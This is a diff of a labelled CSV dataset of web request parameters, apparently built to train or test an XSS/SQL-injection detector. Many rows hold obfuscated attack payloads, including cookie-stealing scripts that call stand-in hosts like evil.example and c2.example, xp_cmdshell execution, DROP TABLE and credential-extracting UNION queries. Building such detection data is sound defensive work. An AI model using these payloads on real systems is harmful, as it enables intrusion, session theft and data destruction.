-&#60;body onload=alert('xss\u0027%29%3E,xss,unicode_substitution
+%3Cbody onload=alert(&#39;xss\u0027\u0029>,xss,unicode_substitution
 %25253Cscript%25253Ealert%252528document.cookie%252529%25253C%25252Fscript%25253E,xss,url_encode+whitespace+double_url_encode
-<svg onload%3Dalert%281%29>,xss,partial_url_encode+unicode_substitution+case_toggle
-%25252527%25255Cu0029%252520OR%252520%25255Cu0028%2525271%25255Cu0027%25253D%252526%25252339%25253B1,sqli,unicode_substitution+url_encode+double_url_encode
+%3Csvg onload=alert%281%29%3E,xss,partial_url_encode+unicode_substitution+case_toggle
+%25252527%25252529%252520OR%252520%25252528%252525271%252526%25252339%25253B%25253D%252525271,sqli,unicode_substitution+url_encode+double_url_encode
 %253Cmarquee%2520onstart%253Dalert%25281%2529%253E,xss,comment_insertion+double_url_encode
 %2522%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E,xss,double_url_encode
 %3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,xss,url_encode+whitespace+unicode_substitution
-%27%20uNiOn%20seLEct%20NULL%2C%20NULL%2C%20NULL%20--,sqli,case_toggle+url_encode+whitespace
-%25253Cvideo%25253E%253Csource%252520onerror%25253Dalert%25281%2529%253E%25253C%25252Fvideo%25253E,xss,double_url_encode+partial_url_encode+unicode_substitution
+%27%20unIoN%20SelECt%20NULL%2C%20NULL%2C%20NULL%20--,sqli,case_toggle+url_encode+whitespace
+%25253Cvideo%25253E%25253Csource%252520onerror%253Dalert%25281%2529%253E%25253C%252Fvideo%253E,xss,double_url_encode+partial_url_encode+unicode_substitution
 %253Cdiv%2520onmouseover%253Dalert%25281%2529%253Ehover%253C%252Fdiv%253E,xss,double_url_encode
 tab=foxtrot,benign,
 user_id=4920,benign,
 sort=asc&callback=foxtrot&coupon=delta,benign,
-admin%2527%2520--,sqli,partial_url_encode+url_encode+comment_insertion
+admin%27%2520--,sqli,partial_url_encode+url_encode+comment_insertion
 tab=surakarta&currency=usd,benign,
 theme=dark&email=laptop@example.com,benign,
 tab=settings&email=settings@example.com,benign,
@@ -348,24 +351,25 @@ price_max=9273&tab=dashboard&sort=desc,benign,
 color=alice&name=budi&sort=asc,benign,
 tab=shoes&user_id=7416&category=budget,benign,
 %2522%2520UNION%2520SELECT%2520table_name%2520FROM%2520information_schema.tables%2520--,sqli,double_url_encode+whitespace
-%25253Cinput%252520onfocus%2525253Dalert%252525281%252529%25252520autofocus%25253E,xss,double_url_encode+partial_url_encode+url_encode
+%25253Cinput%252520onfocus%2525253Dalert%252525281%25252529%25252520autofocus%2525253E,xss,double_url_encode+partial_url_encode+url_encode
 id=3507&callback=echo&sort=desc,benign,
-' OR EXISTS%28SELECT * FROM users\u0029 --,sqli,partial_url_encode+unicode_substitution
+%27%20OR%20EXISTS%28SELECT * FROM users%29 --,sqli,partial_url_encode+unicode_substitution
 callback=orders,benign,
 token=ac6435&city=book&format=json,benign,
-1&#39;%09AND/**/SLEEP%285\u0029	--,sqli,unicode_substitution+whitespace
+"1\u0027/**/AND%09SLEEP%285\u0029
+--",sqli,unicode_substitution+whitespace
 email=delta@example.com,benign,
 tab=orders&session=5e59e27,benign,
 view=grid&id=6069&currency=usd,benign,
-<script>document.location='http://bad-host.example/'+document.cookie</script>,xss,whitespace
+%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fbad-host.example%2F%27%2Bdocument.cookie%3C%2Fscript%3E,xss,whitespace+fallback_full_url_encode
 currency=usd&redirect=/home,benign,
 %2527%2520HAVING%25201%253D1%2520--,sqli,double_url_encode+whitespace
 category=citra&lang=en&price_max=5627,benign,
-%3Cvideo%3E<source onerror=alert%281)%3E%3C/video%3E,xss,partial_url_encode
-%2527%25250AUNION%252509SELECT%25252509NULL%252C%25252509NULL%252C%252509NULL%25252509--,sqli,whitespace+double_url_encode+partial_url_encode
+<video><source onerror%3Dalert(1)><%2Fvideo%3E,xss,partial_url_encode
+%2527%2525250aUNION%25250aSELECT%250ANULL%252C%25250aNULL%252C%250ANULL%25252509--,sqli,whitespace+double_url_encode+partial_url_encode
 %2527%2520OR%25201%253D1%2520--,sqli,double_url_encode
 %3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,xss,url_encode
-<video><source onerror=alert(1)></video>,xss,case_toggle
+%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,xss,case_toggle+fallback_full_url_encode
 category=invoice&limit=1771,benign,
 %253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E,xss,double_url_encode+unicode_substitution+case_toggle
 q=laptop&page=1436,benign,
@@ -373,158 +377,161 @@ limit=3156&sort=desc,benign,
 %25253Cinput%252520onfocus%25253Dalert%2525281%252529%252520autofocus%25253E,xss,url_encode+double_url_encode+case_toggle
 session=5556b82&ref=report&id=3520,benign,
 q=camera&sort=asc&view=grid,benign,
-<body%09onload=alert('xss')>,xss,comment_insertion+whitespace
-%2527%252520UN%25252F%252A%25252A%25252FION%252520SELECT%2520NULL%252C%252520NULL%252C%252520NULL%252520--,sqli,comment_insertion+partial_url_encode+double_url_encode
+<body/**/onload=alert('xss')>,xss,comment_insertion+whitespace
+%2527%2520UNI%252F%25252A%25252150000%25252A%252FON%2520SELECT%2520NULL%252C%252520NULL%252C%252520NULL%252520--,sqli,comment_insertion+partial_url_encode+double_url_encode
 lang=id&search=citra&id=1393,benign,
 theme=dark&size=m&q=alice,benign,
 city=camera&qty=9089,benign,
-%3Cstyle%253E%2540import%20%2527http%253A%252F%252Fevil.example%2Fxss.css%2527%3B%3C%252Fstyle%3E,xss,url_encode+partial_url_encode
+%3Cstyle%3E%2540import%20%2527http%3A%252F%2Fevil.example%2Fxss.css%2527%253B%3C%252Fstyle%3E,xss,url_encode+partial_url_encode
 lang=en&sort=desc,benign,
 %25253Ciframe%252520src%25253Djavascript%25253Aalert%2525281%252529%25253E,xss,url_encode+double_url_encode+unicode_substitution
 size=m&qty=9325,benign,
 search=shoes&coupon=echo&tab=citra,benign,
-<svg%09onload=alert(1)>,xss,whitespace
+<svg/**/onload=alert(1)>,xss,whitespace
 admin%2527%2520--,sqli,case_toggle+double_url_encode
-%2527%252509OR%250A1%253D1%2523,sqli,whitespace+double_url_encode+case_toggle
-1%25253B%2520EXEC%2520xp_cmdshell%2528%252527dir%2527%252529%252520--,sqli,double_url_encode+partial_url_encode
-<details open ontoggle=alert(1)>,xss,case_toggle
+%2527%25250aOR%252F%252A%252A%252F1%253D1%2523,sqli,whitespace+double_url_encode+case_toggle
+1%253B%252520EXEC%2520xp_cmdshell%2528%252527dir%2527%2529%252520--,sqli,double_url_encode+partial_url_encode
+%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
 token=2e8f884&page=2743&id=7901,benign,
 user_id=8667&price_max=9087&tab=phone,benign,
 city=settings&coupon=book&lang=id,benign,
-' OR%201%3D1%20--,sqli,partial_url_encode+comment_insertion
+%27%20OR%201%3D1%20--,sqli,partial_url_encode+comment_insertion
 page=6245&lang=id,benign,
-%252527%25252520OR%252525201%25253D1%25252520--,sqli,double_url_encode+url_encode+partial_url_encode
+%252527%252520OR%2525201%2525253D1%25252520--,sqli,double_url_encode+url_encode+partial_url_encode
 city=laptop&name=delta&session=331056d,benign,
 price_min=4273&name=budget&lang=en,benign,
-\u0022 UN/**/ION selECT table_name frOM information_schema.tables --,sqli,comment_insertion+case_toggle+unicode_substitution
-%27%2520AND%2520%2528SELECT%2520COUNT%28%252A%29%2520FROM%2520users%2529%20%3E%200%20--,sqli,partial_url_encode+url_encode
+%22 UNI/**/ON SELeCt table_name frOM information_schema.tables --,sqli,comment_insertion+case_toggle+unicode_substitution
+%27%2520AND%2520%2528SELECT%20COUNT%2528%252A%2529%20FROM%20users%29%2520%253E%200%2520--,sqli,partial_url_encode+url_encode
 price_max=8085,benign,
 callback=foxtrot,benign,
 token=4432819&lang=en,benign,
 %253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E,xss,case_toggle+double_url_encode
 price_max=481&limit=7729,benign,
-'/**/AND%09(SELECT	COUNT\u0028*\u0029	FROM/**/users\u0029%0a\u003E%090	--,sqli,whitespace+unicode_substitution
+"\u0027%0aAND
+%28SELECT	COUNT%28*\u0029/**/FROM/**/users%29%0a&#62;%0a0%0a--",sqli,whitespace+unicode_substitution
 %252522%252520OR%252520%2525221%252522%25253D%2525221,sqli,double_url_encode+url_encode+unicode_substitution
 %253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E,xss,case_toggle+double_url_encode
-%25253Cscript%25253Eeval%2528atob%2528%2527YWxlcnQoMSk%25253D%2527%2529%252529%253C%252Fscript%253E,xss,whitespace+partial_url_encode+double_url_encode
-%2527%2520OR%25201%253D1%2523,sqli,unicode_substitution+double_url_encode
+%25253Cscript%253Eeval%252528atob%2528%252527YWxlcnQoMSk%25253D%2527%252529%252529%25253C%25252Fscript%253E,xss,whitespace+partial_url_encode+double_url_encode
+%255Cu0027%2520OR%25201%253D1%2523,sqli,unicode_substitution+double_url_encode
 %252522%25253E%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E,xss,double_url_encode+url_encode
-"' UNion sELect NULL, NULL, NULL --",sqli,case_toggle
-<iframe%0asrc=javascript:alert(1)>,xss,whitespace+comment_insertion
+"' UnIon SeleCT NULL, NULL, NULL --",sqli,case_toggle
+<iframe	src=javascript:alert(1)>,xss,whitespace+comment_insertion
 offset=5203,benign,
-<details open ontoggle=alert(1)>,xss,comment_insertion
+%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E,xss,comment_insertion+fallback_full_url_encode
 theme=dark&color=orders,benign,
-%253Cscript%253Enew%2520Image%2528%252529.src%253D%2527http%253A%252F%252Fattacker.test%25252F%25253Fc%25253D%252527%252Bdocument.cookie%25253B%25253C%25252Fscript%25253E,xss,comment_insertion+double_url_encode+partial_url_encode
+%253Cscript%25253Enew%2520Image%252528%252529.src%253D%2527http%25253A%252F%252Fattacker.test%25252F%253Fc%25253D%2527%252Bdocument.cookie%25253B%25253C%25252Fscript%253E,xss,comment_insertion+double_url_encode+partial_url_encode
 sort=desc&token=48be168,benign,
 q=echo,benign,
 session=203f2d2&view=grid&q=delta,benign,
 color=dashboard&user_id=1495,benign,
-<img src=x onerror=this.src=&#39;http://evil.example/'+document.cookie>,xss,unicode_substitution+comment_insertion
+&lt;img src=x onerror=this.src=\u0027http://evil.example/'+document.cookie>,xss,unicode_substitution+comment_insertion
 limit=7556,benign,
 size=m&lang=id&search=laptop,benign,
 page=6451&name=citra&lang=id,benign,
 session=55d71c6,benign,
-<script>fetch('http://c2.example/steal?c='+document.cookie)</script>,xss,comment_insertion
+%3Cscript%3Efetch%28%27http%3A%2F%2Fc2.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,xss,comment_insertion+fallback_full_url_encode
 page=8973,benign,
 user_id=1531&price_max=2763&city=jakarta,benign,
 price_min=8314,benign,
 price_max=3258&id=3612&city=laptop,benign,
-1%09or%091=1,sqli,case_toggle+unicode_substitution+whitespace
+1%0aOr%091=1,sqli,case_toggle+unicode_substitution+whitespace
 %252527%252520OR%252520SLEEP%2525288%252529%25253D%2525270,sqli,url_encode+double_url_encode+whitespace
 email=orders@example.com&coupon=laptop&category=echo,benign,
-%3Cscript%3Efetch%2528%2527http%3A%2F%252Fevil.example%252Fsteal%253Fc%253D%27%252Bdocument.cookie%29%253C%252Fscript%253E,xss,partial_url_encode+url_encode
+%253Cscript%253Efetch%2528%2527http%253A%252F%2Fevil.example%2Fsteal%253Fc%3D%2527%252Bdocument.cookie%2529%253C%2Fscript%3E,xss,partial_url_encode+url_encode
 %253Csvg%2520onload%253Dalert%25281%2529%253E,xss,comment_insertion+double_url_encode
 view=grid&city=surakarta&theme=dark,benign,
-"%3Ca href%3D""javascript:alert(1)%22>click</a%3E",xss,partial_url_encode
+"%3Ca%20href=""javascript%3Aalert(1%29%22>click<%2Fa>",xss,partial_url_encode
 format=json&price_max=5665&sort=desc,benign,
 city=foxtrot&color=camera,benign,
 %253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,xss,double_url_encode+whitespace
 q=delta,benign,
-%3Cscript%3Enew%20Image%28).src=%27http%3A%2F%2Fevil.example/%3Fc%3D'+document.cookie;%3C%2Fscript>,xss,partial_url_encode+whitespace
+<script>new%20Image%28).src='http://evil.example/?c='%2Bdocument.cookie%3B%3C%2Fscript>,xss,partial_url_encode+whitespace
 city=shoes&limit=526&size=m,benign,
-%253Csvg%2520onload%253Dalert%25281%2529%3E,xss,partial_url_encode+comment_insertion+url_encode
+%253Csvg%20onload%253Dalert%281%29%3E,xss,partial_url_encode+comment_insertion+url_encode
 %27%20OR%201%3D1%20--,sqli,url_encode+comment_insertion
-<img%0asrc=x%0aonerror=this.src='http://evil.example/'+document.cookie>,xss,whitespace
+<img	src=x%0aonerror=this.src='http://evil.example/'+document.cookie>,xss,whitespace
 page=2882&coupon=citra&city=budget,benign,
-%27><script>alert%281)%3C/script>,xss,whitespace+case_toggle+partial_url_encode
+%27%3E%3Cscript%3Ealert(1)</script>,xss,whitespace+case_toggle+partial_url_encode
 %22%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20--,sqli,url_encode
 session=558d929&lang=id&category=foxtrot,benign,
-\u003Cscript&%2362;alert%28document.cookie%29%26%2360%3B/script%26gt;,xss,unicode_substitution+partial_url_encode
-<script>alert(document.cookie)</script>,xss,whitespace
+&%2360%3Bscript%3Ealert%5Cu0028document.cookie%29&lt;%2Fscript%3E,xss,unicode_substitution+partial_url_encode
+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,xss,whitespace+fallback_full_url_encode
 1%252520OR%2525201%25253D1,sqli,comment_insertion+double_url_encode+url_encode
 session=520f8e5,benign,
 session=1def43e&color=phone&currency=usd,benign,
-"1;%09ExEc/**/xp_cmdshell('dir')
+"1;/**/exec
+xp_cmdshell('dir')
 --",sqli,case_toggle+whitespace
 email=foxtrot@example.com,benign,
 limit=9425,benign,
 session=1de42ed&limit=7904&price_max=5583,benign,
-"'/**/OR
-'a'='a",sqli,whitespace
+'	OR%09'a'='a,sqli,whitespace
 price_min=437&user_id=4351,benign,
-\u003Cstyle&gt;@import &#39;http://evil.example/xss.css';&lt;/style>,xss,case_toggle+unicode_substitution+comment_insertion
+&#60;style%3E@import %27http://evil.example/xss.css%27;&lt;/style>,xss,case_toggle+unicode_substitution+comment_insertion
 session=3521f30,benign,
-%252527%252529%25252520OR%25252520%252528%2525271%25252527%2525253D%252525271,sqli,partial_url_encode+url_encode+double_url_encode
+%252527%25252529%25252520OR%25252520%252528%252525271%252527%25253D%2525271,sqli,partial_url_encode+url_encode+double_url_encode
 session=391974f&sort=asc,benign,
 session=4ef7eb7&redirect=/home,benign,
 user_id=1261,benign,
 q=orders&sort=desc,benign,
-%253Cdetails%252520open%252520ontoggle%25253Dalert%25281%2529%25253E,xss,partial_url_encode+double_url_encode
+%25253Cdetails%2520open%252520ontoggle%25253Dalert%25281%252529%253E,xss,partial_url_encode+double_url_encode
 qty=2763&session=5b90675,benign,
 id=576,benign,
 %253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,xss,double_url_encode
-"admin\u0027
---",sqli,partial_url_encode+whitespace+unicode_substitution
-%2527%2520OR%2520SLEEP%2525287%2529%25253D%2525270,sqli,partial_url_encode+double_url_encode+unicode_substitution
-%2527%2520OR%252520%25271%2527%253D%2525271,sqli,double_url_encode+partial_url_encode+unicode_substitution
+admin%27%20--,sqli,partial_url_encode+whitespace+unicode_substitution
+%252527%252520OR%2520SLEEP%2525287%2529%253D%25270,sqli,partial_url_encode+double_url_encode+unicode_substitution
+%2527%252520OR%252520%25271%2527%253D%25271,sqli,double_url_encode+partial_url_encode+unicode_substitution
 color=foxtrot&view=grid&format=json,benign,
 city=budi&id=150,benign,
-\u003Cmarquee onstart=alert\u00281)\u003E,xss,unicode_substitution
+%3Cmarquee onstart=alert%281\u0029%3E,xss,unicode_substitution
 offset=4912&session=2919ab6,benign,
 sort=asc&price_min=6358&view=grid,benign,
 limit=9336&ref=orders,benign,
 sort=desc&search=settings&color=budi,benign,
-%27%20uNion%20SeLect%20username%2C%20password%20froM%20users%20--,sqli,case_toggle+url_encode
+%27%20UnIoN%20sELECT%20username%2C%20password%20frOm%20users%20--,sqli,case_toggle+url_encode
 category=phone,benign,
 %25253Cscript%25253Ealert%252528%252527xss%252527%252529%25253C%25252Fscript%25253E,xss,url_encode+double_url_encode+unicode_substitution
-\u0027%20AND %28SELECT COUNT%28*\u0029 FROM%20users%29 %3E%200 --,sqli,partial_url_encode+unicode_substitution
-<input onfocus=alert(1) autofocus>,xss,comment_insertion
+%27 AND %28SELECT%20COUNT%28%2A%29 FROM users) &gt; 0 --,sqli,partial_url_encode+unicode_substitution
+%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,xss,comment_insertion+fallback_full_url_encode
 lang=en&coupon=settings&price_max=6690,benign,
 price_max=7106,benign,
 email=budi@example.com&session=d7ca65&format=json,benign,
 qty=8815,benign,
-<input/**/onfocus=alert(1)%0aautofocus>,xss,whitespace
-%27%20or%2520SLEEP%252810%2529%253D%25270,sqli,case_toggle+partial_url_encode+url_encode
+"<input/**/onfocus=alert(1)
+autofocus>",xss,whitespace
+%2527%20Or%20SLEEP%252810%29%3D%25270,sqli,case_toggle+partial_url_encode+url_encode
 page=4263,benign,
-<script>alert('xss')</script>,xss,case_toggle
-<iframe%0asrc=javascript:alert(1)>,xss,whitespace+comment_insertion
-%3Cimg	src=x%09onerror=this.src=&#39;http://bad-host.example/\u0027+document.cookie\u003E,xss,unicode_substitution+whitespace+case_toggle
+%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E,xss,case_toggle+fallback_full_url_encode
+<iframe	src=javascript:alert(1)>,xss,whitespace+comment_insertion
+"&lt;img
+src=x/**/onerror=this.src=%27http://bad-host.example/\u0027+document.cookie&gt;",xss,unicode_substitution+whitespace+case_toggle
 currency=usd&price_min=945&id=7479,benign,
 size=m&lang=id,benign,
 ref=profile&email=report@example.com&q=book,benign,
-%27%20Union%20sELECt%20username%2C%20password%20frOM%20users%20--,sqli,case_toggle+url_encode
+%27%20UnIOn%20seLeCt%20username%2C%20password%20FroM%20users%20--,sqli,case_toggle+url_encode
 category=alice&id=6542,benign,
 id=528&price_min=5411&tab=foxtrot,benign,
-%2527%25253B%2520DRop%252520TABLE%2520users%253B%2520--,sqli,partial_url_encode+case_toggle+double_url_encode
+%252527%253B%252520DROP%252520TABLE%2520users%25253B%2520--,sqli,partial_url_encode+case_toggle+double_url_encode
 session=59b3e8e&tab=profile,benign,
 qty=8729&token=4c6322d&offset=3288,benign,
 theme=dark&format=json,benign,
 %27%20OR%201%3D1%20--,sqli,url_encode+case_toggle
 %2527%2520OR%2520%2527a%2527%253D%2527a,sqli,double_url_encode+comment_insertion
-"""/**/OR/**/""1""=%221",sqli,partial_url_encode+whitespace
+"""%20OR%09%221%22=""1",sqli,partial_url_encode+whitespace
 view=grid,benign,
 token=1db6259&offset=4985,benign,
-%27 OR '1%27='1,sqli,partial_url_encode+unicode_substitution
+%27%20OR%20%271\u0027%3D\u00271,sqli,partial_url_encode+unicode_substitution
 offset=5310,benign,
-"\u0027;	dROP%09TABLE%09users;
+"&#39;;
+DrOp	tabLe	users;
 --",sqli,case_toggle+unicode_substitution+whitespace
-%3Ca%20href%253D%2522javascript%3Aalert%281%2529%22%253Eclick%3C%252Fa%3E,xss,url_encode+partial_url_encode+unicode_substitution
+%3Ca%20href%3D%2522javascript%253Aalert%25281%2529%22%253Eclick%3C%2Fa%3E,xss,url_encode+partial_url_encode+unicode_substitution
 page=1466&coupon=shoes&redirect=/home,benign,
-' OR SLEEP(5\u0029='0,sqli,unicode_substitution
-1&#39; AND SLEEP\u00283%29 --,sqli,unicode_substitution
-<video><source onerror=alert(1)></video>,xss,case_toggle
-%2527%2509OR%252F%252A%252A%252F%255Cu0027a%2526%252339%253B%253D%255Cu0027a,sqli,unicode_substitution+whitespace+double_url_encode
+%27 OR SLEEP%285%29=&#39;0,sqli,unicode_substitution
+1%27 AND SLEEP\u00283%29 --,sqli,unicode_substitution
+%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,xss,case_toggle+fallback_full_url_encode
+%252527%252F%252A%252A%252FOR%252509%252527a%255Cu0027%253D%2527a,sqli,unicode_substitution+whitespace+double_url_encode
 format=json&lang=en,benign,
-1'%0aAND	1%3D1%2509--,sqli,whitespace+partial_url_encode
-<iframe src=javascript:alert(1)>,xss,case_toggle
+1'	AND%091=1%0A--,sqli,whitespace+partial_url_encode
+%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
 limit=1220&format=json&session=d1abd9,benign,
